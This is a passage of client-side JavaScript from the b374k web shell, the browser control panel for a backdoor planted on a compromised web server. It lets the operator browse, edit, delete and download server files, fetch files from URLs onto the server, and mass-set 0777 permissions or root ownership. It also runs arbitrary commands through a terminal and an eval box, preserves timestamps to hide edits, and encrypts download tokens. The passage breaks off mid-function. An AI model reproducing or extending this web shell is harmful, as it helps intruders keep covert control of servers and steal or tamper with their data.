
function action(path, type){
	title = "Action";
	content = '';
	if(type=='file') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";
	if(type=='dir') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";
	if(type=='dot') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";
	show_box(title, content);
	xpl_bind();
}

function navigate(path, showfiles){
	if(showfiles==null) showfiles = 'true';
	send_post({ cd:path, showfiles:showfiles }, function(res){
		if(res!='error'){
			splits = res.split('{[|b374k|]}');
			if(splits.length==3){
				$('#nav').html(splits[1]);
				if(showfiles=='true'){
					$('#explorer').html('');
					$('#explorer').html(splits[2]);
					sorttable.k($('#xplTable').get(0));
				}
				$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');
				xpl_bind();
				window_resize();
			}
		}
	});
}

function view(path, type, preserveTimestamp){
	if(preserveTimestamp==null) preserveTimestamp = 'true';
	send_post({ viewFile: path, viewType: type, preserveTimestamp:preserveTimestamp }, function(res, decode_fail){
        var index = res.indexOf('|');
        var writable = true;
        if(index !== -1) {
            if(res.substring(0, index) !== "true") {
                writable = false;
            }
            res = res.substring(index + 1);
        }
		if(res!='error'){
            var explorer = $('#explorer');
            explorer.html('');
            explorer.html(res);
			xpl_bind();
			show_tab('explorer');
			if((type=='edit')||(type=='hex')){
				editResult = (type=='edit')? $('#editResult'):$('#editHexResult');
				if(editSuccess=='success'){
					editResult.html(' ( File saved )');
				}
				else if(editSuccess=='error'){
					editResult.html(' ( <span style="color: red;">Failed to save file</span> )');
				}
				editSuccess = '';

				if(decode_fail || !writable) {
					var editInput = $('#editInput');
                    // editInput.css("background-color", "gray");
                    editInput.attr("readonly", "readonly");
                    var button = $('#editTbl').find('.button');
                    button.removeAttr('onclick');
                    button.off('click');
                    button.on('click', function() {
                        if(!writable) {
                            editResult.html(' ( <span style="color: red;">Readonly file</span> )');
                        } else {
                            editResult.html(' ( <span style="color: red;">Decode content failed</span> )');
						}
					});
                }
			}
			cbox_bind('editTbl');
		}
	});
}

function view_entry(el){
	var data_path = $(el).attr('data-path');
	if(data_path!=''){
		entry = data_path;
		var form = $('#form');
        form.append("<input type='hidden' name='viewEntry' value='"+entry+"'>");
        form.submit();
        form.html('');
	}
}

function ren(path){
	title = "Rename";
	content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" +path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";
	show_box(title, content);
}

function ren_go(){
	renameFile = $('.renameFile').val();
	renameFileTo = $('.renameFileTo').val();
	send_post({renameFile:renameFile, renameFileTo:renameFileTo}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
			$('.renameFile').val($('.renameFileTo').val());
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function newfolder(path){
	title = "New Folder";
	path = path + 'newfolder-' + time();
	content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";
	show_box(title, content);
}

function newfolder_go(){
	newFolder = $('.newFolder').val();
	send_post({newFolder:newFolder}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function newfile(path){
	title = "New File";
	path = path + 'newfile-' + time();
	content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";
	show_box(title, content);
}

function newfile_go(){
	newFile = $('.newFile').val();
	send_post({newFile:newFile}, function(res){
		if(res!='error'){
			view(newFile, 'edit');
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function viewfileorfolder(){
	title = "View File / Folder";
	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
	show_box(title, content);
}

function viewfileorfolder_go(){
	entry = $('.viewFileorFolder').val();
	send_post({viewFileorFolder:entry}, function(res){
		if(res!='error'){
			if(res=='file'){
				view(entry, 'auto');
				show_tab('explorer');
			}
			else if(res=='folder'){
				navigate(entry);
				show_tab('explorer');
			}
		}
	});
}

function del(path){
	title = "Delete";
	content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";
	show_box(title, content);
}

function delete_go(){
	path = $('.delete').val();
	send_post({delete:path}, function(res){
		if(res!='error'){
			navigate(res);
			$('.boxresult').html('Operation(s) succeeded');
		}
		else $('.boxresult').html('Operation(s) failed');
	});
}

function find(path){
	findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
	findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
	$('#explorer').html("<div id='xplUpload'>" +findfile+'<br>'+findfolder+'</div>');
	cbox_bind('xplUpload');
}

function find_go_file(){
	find_go('file');
}

function find_go_folder(){
	find_go('folder');
}

function find_go(findType){
	findPath = (findType=='file')? $('.findfilePath').val():$('.findFolderPath').val();
	findResult = (findType=='file')? $('.findfileResult'):$('.findResult');

	findName = (findType=='file')? $('.findfileFilename').val():$('.findFoldername').val();
	findNameRegex = (findType=='file')? $('.findfileFilenameRegex').hasClass('cBoxSelected').toString():$('.findFoldernameRegex').hasClass('cBoxSelected').toString();
	findNameInsensitive = (findType=='file')? $('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString():$('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();

	findContent = (findType=='file')? $('.findfileContains').val():"";
	findContentRegex = (findType=='file')? $('.findfileContainsRegex').hasClass('cBoxSelected').toString():"";
	findContentInsensitive = (findType=='file')? $('.findfileContainsInsensitive').hasClass('cBoxSelected').toString():"";

	findReadable = (findType=='file')? $('.findfileReadable').hasClass('cBoxSelected').toString():$('.findWritable').hasClass('cBoxSelected').toString();
	findWritable = (findType=='file')? $('.findfileWritable').hasClass('cBoxSelected').toString():$('.findReadable').hasClass('cBoxSelected').toString();
	findExecutable = (findType=='file')? $('.findfileExecutable').hasClass('cBoxSelected').toString():$('.findExecutable').hasClass('cBoxSelected').toString();

	send_post(
		{
			findType:findType,
			findPath:findPath,
			findName:findName,
			findNameRegex:findNameRegex,
			findNameInsensitive:findNameInsensitive,
			findContent:findContent,
			findContentRegex:findContentRegex,
			findContentInsensitive:findContentInsensitive,
			findReadable:findReadable,
			findWritable:findWritable,
			findExecutable:findExecutable
		},
		function(res){
			if(res!='error'){
				findResult.html(res);
			}
		}
	);
}

function ul_go_comp(){
	ul_go('comp');
}

function ul_go_url(){
	ul_go('url');
}

function ul(path){
	ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
	ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
	content = ulcomputer + '<br>' + ulurl + "<input type='hidden' class='ul_path' value='"+path+"'>";
	$('#explorer').html(content);
	ul_add_comp();
	ul_add_url();

	$('#ulDragNDrop').on('dragenter', function(e){
		e.stopPropagation();
		e.preventDefault();
	});

	$('#ulDragNDrop').on('dragover', function(e){
		e.stopPropagation();
		e.preventDefault();
	});

	$('#ulDragNDrop').on('drop', function(e){
		e.stopPropagation();
		e.preventDefault();

		files = e.target.files || e.dataTransfer.files;
		ulResult = $('.ulDragNDropResult');
		ulResult.html('');
		$.each(files, function(i){
			if(this){
				ulType = 'DragNDrop';
				filename = this.name;

				var formData = new FormData();
				formData.append('ulFile', this);
				formData.append('ulSaveTo', get_cwd());
				formData.append('ulFilename', filename);
				formData.append('ulType', 'comp');

				entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
				ulResult.append(entry);

				if(this.size<=0){
					$('.ulProgress'+ulType+i).html('( failed )');
					$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
					$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
				}else{
					ul_start(formData, ulType, i);
				}
			}
		});
	});
}

function ul_add_comp(path){
	path = html_safe($('.ul_path').val());
	$('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>");
}

function ul_add_url(path){
	path = html_safe($('.ul_path').val());
	$('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>");
}

function ul_start(formData, ulType, i){
	loading_start();
	$.ajax({
		url: targeturl,
		type: 'POST',
		data: formData,
		cache: false,
		contentType: false,
		processData: false,
		xhr: function(){
			myXhr = $.ajaxSettings.xhr();
			if(myXhr.upload){
				myXhr.upload.addEventListener('progress', function(e){
					percent = Math.floor(e.loaded / e.total * 100);
					$('.ulProgress'+ulType+i).html('( '+ percent +'% )');
				}, false);
			}
			return myXhr;
		},
		success: function(r){
            var ret = parse_resp(r);
            if(ret == null) {
                return;
            }

            $('#server_date').html(ret['date']);
            $('#client_ip').html(ret['ip']);

            var data = ret['data'];
			if(data.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)){
				res = 'error';
			}

			if(data=='error'){
				$('.ulProgress'+ulType+i).html('( <span style="color: red;">failed</span> )');
			}
			else{
				$('.ulRes'+ulType+i).html(data);
			}
			loading_stop();
		},
		error: function(){
			loading_stop();
			$('.ulProgress'+ulType+i).html('( failed )');
			$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
			$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
		}
	});
}

function ul_go(ulType){
	ulFile = (ulType=='comp')? $('.ulFileComp'):$('.ulFileUrl');
	ulResult = (ulType=='comp')? $('.ulCompResult'):$('.ulUrlResult');
	ulResult.html('');

	ulFile.each(function(i){
		if(((ulType=='comp')&&this.files[0])||((ulType=='url')&&(this.value!=''))){
			file = (ulType=='comp')? this.files[0]: this.value;
			filename = (ulType=='comp')? file.name: file.substring(file.lastIndexOf('/')+1);

			ulSaveTo = (ulType=='comp')? $('.ulSaveToComp')[i].value:$('.ulSaveToUrl')[i].value;
			ulFilename = (ulType=='comp')? $('.ulFilenameComp')[i].value:$('.ulFilenameUrl')[i].value;

            entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
            ulResult.append(entry);

			if(ulType == 'comp') {
				if(file.size<=0) {
                    $('.ulProgress'+ulType+i).html('( failed )');
                    $('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
                    $('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
				} else {
                    var formData = new FormData();
                    formData.append('ulFile', file);
                    formData.append('ulSaveTo', ulSaveTo);
                    formData.append('ulFilename', ulFilename);
                    formData.append('ulType', ulType);
                    ul_start(formData, ulType, i);
				}
			} else {
                send_post({ulFile: file,ulSaveTo: ulSaveTo,ulFilename: ulFilename,ulType: ulType}, function(res) {
                    if(res=='error'){
                        $('.ulProgress'+ulType+i).html('( <span style="color: red;">failed</span> )');
                    }else{
                        $('.ulRes'+ulType+i).html(res);
                    }
                });
			}
		}
	});
}

function trap_ctrl_enter(el, e, callback){
	if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
		if(callback!=null) window[callback]();
	}
	fix_tabchar(el, e);
}

function edit_save_raw(){
	edit_save('edit');
}

function edit_save_hex(){
	edit_save('hex');
}

function edit_save(editType){
	editFilename = $('#editFilename').val();
	editInput = $('#editInput').val();
	editSuccess = false;
	preserveTimestamp = 'false';
	if($('.cBox').hasClass('cBoxSelected')) preserveTimestamp = 'true';
	send_post({editType:editType,editFilename:editFilename,editInput:editInput,preserveTimestamp:preserveTimestamp},
		function(res){
			if(res!='error'){
				editSuccess = 'success';
				view(editFilename, editType, preserveTimestamp);
			} else {
				editSuccess = 'error';
                view(editFilename, editType, preserveTimestamp);
            }
		}
	);
}



function mass_act(type){
	var buffer = get_all_cbox_selected('xplTable', 'xpl_href');

	var arcType, title;
	if((type=='cut')||(type=='copy')){
		localStorage.setItem('bufferLength', buffer.length);
		localStorage.setItem('bufferAction', type);
		$.each(buffer,function(i,v){
			localStorage.setItem('buffer_'+i, v);
		});
	}
	else if(type=='paste'){
		var bufferLength = localStorage.getItem('bufferLength');
		var bufferAction = localStorage.getItem('bufferAction');
		if(bufferLength>0){
			var massBuffer = '';
			for(var i=0;i<bufferLength;i++){
				var buff = localStorage.getItem('buffer_'+i);
				if(buff){
					massBuffer += buff + '\n';
				}
			}
			massBuffer = $.trim(massBuffer);

			if(bufferAction=='cut') title = 'move';
			else if(bufferAction=='copy') title = 'copy';

			var content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}

	}
	else if((type=='extract (tar)')||(type=='extract (tar.gz)')||(type=='extract (zip)')){
		if(type=='extract (tar)') arcType = 'untar';
		else if(type=='extract (tar.gz)') arcType = 'untargz';
		else if(type=='extract (zip)') arcType = 'unzip';

		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'  onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}
	else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){
		var rand = new Date().getTime();
		var arcFilename;
		if(type=='compress (tar)'){
			arcType = 'tar';
			arcFilename = rand+'.tar';
		}
		else if(type=='compress (tar.gz)'){
			arcType = 'targz';
			arcFilename = rand+'.tar.gz';
		}
		else if(type=='compress (zip)'){
			arcType = 'zip';
			arcFilename = rand+'.zip';
		}

		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}
    else if((type==='download (tar)')||(type==='download (tar.gz)')||(type==='download (zip)')){
        rand = new Date().format('yyyyMMddhhmmssS');
        if(type=='download (tar)'){
            arcType = 'dtar';
            arcFilename = rand+'.tar';
        }
        else if(type=='download (tar.gz)'){
            arcType = 'dtargz';
            arcFilename = rand+'.tar.gz';
        }
        else if(type=='download (zip)'){
            arcType = 'dzip';
            arcFilename = rand+'.zip';
        }

        if(buffer.length>0){
            massBuffer = '';
            $.each(buffer,function(i,v){
                massBuffer += v + '\n';
            });
            massBuffer = $.trim(massBuffer);
            title = type;

            content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">download</span></td></tr></table>";
            show_box(ucfirst(title), content);
        }
    }
	else if(type!=''){
		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;
			var line = '';
			if(type=='chmod') line = "<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			else if(type=='chown') line = "<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			else if(type=='touch'){
				var now = new Date();
				line = "<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			}

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}

	$('.cBoxSelected').removeClass('cBoxSelected');
	xpl_update_status();
}

function mass_act_go_tar(){
	mass_act_go('tar');
}

function mass_act_go_targz(){
	mass_act_go('targz');
}

function mass_act_go_zip(){
	mass_act_go('zip');
}

function mass_act_go_untar(){
	mass_act_go('untar');
}

function mass_act_go_untargz(){
	mass_act_go('untargz');
}

function mass_act_go_unzip(){
	mass_act_go('unzip');
}

function mass_act_go_paste(){
	mass_act_go('paste');
}

function mass_act_go_chmod(){
	mass_act_go('chmod');
}

function mass_act_go_chown(){
	mass_act_go('chown');
}

function mass_act_go_touch(){
	mass_act_go('touch');
}

function mass_act_go(massType){
	var massBuffer = $.trim($('.massBuffer').val());
    var massPath = get_cwd();
    var massValue = '';
    var download = false;
	if(massType=='paste'){
        var bufferLength = localStorage.getItem('bufferLength');
        var bufferAction = localStorage.getItem('bufferAction');
		if(bufferLength>0){
			massBuffer = '';
			for(var i=0;i<bufferLength;i++){
				if((buff = localStorage.getItem('buffer_'+i))){
					massBuffer += buff + '\n';
				}
			}
			massBuffer = $.trim(massBuffer);
			if(bufferAction=='copy') massType = 'copy';
			else if(bufferAction=='cut') massType = 'cut';
		}
	}
	else if((massType=='chmod')||(massType=='chown')||(massType=='touch')){
		massValue = $('.massValue').val();
	}
	else if((massType=='tar')||(massType=='targz')||(massType=='zip')){
		massValue = $('.massValue').val();
	}
    else if((massType=='dtar')||(massType=='dtargz')||(massType=='dzip')){
        massValue = $('.massValue').val();
        download = true;
        massType = massType.substring(1);
    }
	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')||(massType=='download')){
		massValue = $('.massValue').val();
	}

	if(massBuffer === '') {
		return;
    }

    var args = {massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue};
    if(download) {
        var params = $.param(args);
        var dz_token = bin2hex(rc4(window['cipher_key'], params));

        var form = $('#form');
        form.append("<input type='hidden' name='dz_token' value='"+dz_token+"'>");
        form.submit();
        form.html('');
        hide_box();
	} else {
        send_post(args, function(res){
            if(res!='error'){
                $('.boxresult').html(res+' Operation(s) succeeded');
            }
            else $('.boxresult').html('Operation(s) failed');
            navigate(get_cwd());
        });
	}
}

function xpl_update_status(){
	var totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
	if(totalSelected==0) $('.xplSelected').html('');
	else $('.xplSelected').html(', '+totalSelected+' item(s) selected');
}


function xpl_bind(){
	$('.navigate').off('click');
	$('.navigate').on('click', function(e){
		path = xpl_href($(this));
		navigate(path);
		hide_box();
	});

	$('.navbar').off('click');
	$('.navbar').on('click', function(e){
		path = $(this).attr('data-path');
		navigate(path);
		hide_box();
	});

	$('.newfolder').off('click');
	$('.newfolder').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		newfolder(path);
	});

	$('.newfile').off('click');
	$('.newfile').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		newfile(path);
	});

	$('.del').off('click');
	$('.del').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		del(path);
	});

	$('.view').off('click');
	$('.view').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'auto');
		hide_box();
	});

	$('.hex').off('click');
	$('.hex').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'hex');
	});

	$('#viewFullsize').off('click');
	$('#viewFullsize').on('click', function(e){
		src = $('#viewImage').attr('src');
		window.open(src);
	});

	$('.edit').off('click');
	$('.edit').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'edit');
		hide_box();
	});

	$('.ren').off('click');
	$('.ren').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		ren(path);
	});

	$('.action').off('click');
	$('.action').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'file');
	});

	$('.actionfolder').off('click');
	$('.actionfolder').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'dir');
	});

	$('.actiondot').off('click');
	$('.actiondot').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'dot');
	});

	$('.dl').off('click');
	$('.dl').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		$('#form').append("<input type='hidden' name='df_token' value='"+bin2hex(encodeURIComponent(path))+"'>");
		$('#form').submit();
		$('#form').html('');
		hide_box();
	});

	$('.ul').off('click');
	$('.ul').on('click', function(e){
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		ul(path);
		hide_box();
	});

	$('.find').off('click');
	$('.find').on('click', function(e){
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		find(path);
		hide_box();
	});

	$('#massAction').off('click');
	$('#massAction').on('change', function(e){
		type = $('#massAction').val();
		mass_act(type);
		$('#massAction').val('Action');
	});

	cbox_bind('xplTable','xpl_update_status');
}

function xpl_href(el){
	var my = el.attr('data-path');
	if(my != null) {
		return my;
    }
	return el.parent().parent().attr('data-path');
}

function multimedia(path){
	var a = $('video').get(0);
	send_post({multimedia:path}, function(res){
		a.src = res;
	});
	hide_box();
}

$('#terminalInput').on('keydown', function(e){
    if(e.ctrlKey && e.keyCode === 85){//ctrl+u
    	$(this).val('');
        return;
    }
	if(e.keyCode==13){
		var cmd = $(this).val();
		var index = terminalHistory.indexOf(cmd);
		if(index !== -1) {
			terminalHistory.splice(index, 1);
		}
		terminalHistory.push(cmd);
		terminalHistoryPos = terminalHistory.length;
		if(cmd=='clear'||cmd=='exit'){
			$('#terminalOutput').html('');
		}else if((path = cmd.match(/cd(.*)/i)) || (path = cmd.match(/^([a-z]:)$/i))){
			path = $.trim(path[1]);
			navigate(path);
		}else if(cmd!=''){
			send_post({ terminalInput: cmd }, function(res){
				var cwd = html_safe(get_cwd());
				var pph = $('#prompt_part').html();
				res = (pph != null ? '<span class="strong">'+pph+'</span>' : '')+'<span class=\'strong\'>'+cwd+'&gt;</span>'+html_safe(cmd)+ '\n' + res+'\n';
				$('#terminalOutput').append(res);
				$(window).scrollTop($(document).height()-$(window).height());
                $('#terminalInput').focus();
			});
		}
		$(this).val('');
	}else if(e.keyCode==38){
		if(terminalHistoryPos>0){
			terminalHistoryPos--;
			$(this).val(terminalHistory[terminalHistoryPos]);
			if(terminalHistoryPos<0) terminalHistoryPos = 0;
		}else{
            $(this).val('');
            terminalHistoryPos = -1;
        }
        return false;
	}else if(e.keyCode==40){
		if(terminalHistoryPos<terminalHistory.length-1){
			terminalHistoryPos++;
			$(this).val(terminalHistory[terminalHistoryPos]);
			if(terminalHistoryPos>terminalHistory.length) terminalHistoryPos = terminalHistory.length;
		}else{
            $(this).val('');
            terminalHistoryPos = terminalHistory.length;
        }
        return false;
	}
	fix_tabchar(this, e);
});

function eval_go(){
	var evalType = $('#evalType').val();
    var evalInput = $('#evalInput').val();
    var evalOptions = $('#evalOptions').val();
    var evalArguments = $('#evalArguments').val();

	if(evalOptions=='Options/Switches') evalOptions = '';
	if(evalArguments=='Arguments') evalArguments = '';

	if($.trim(evalInput)!=''){
		send_post({ evalInput:evalInput, evalType:evalType, evalOptions:evalOptions, evalArguments:evalArguments },
			function(res){
				if(res!='error'){
				    localStorage.setItem('eval', evalInput);
                    var splits = res.split('{[|b374k|]}');
					if(splits.length==2){
						$('#evalOutput').html(splits[0]+"<hr>"+splits[1]);
					}else{
						$('#evalOutput').html(res);
					}
				}
			}
		);
	}
}

function eval_init(){
	if((evalSupported = localStorage.getItem('evalSupported'))){
		eval_bind();
		output("eval : "+evalSupported);
		evalReady = true;
	}
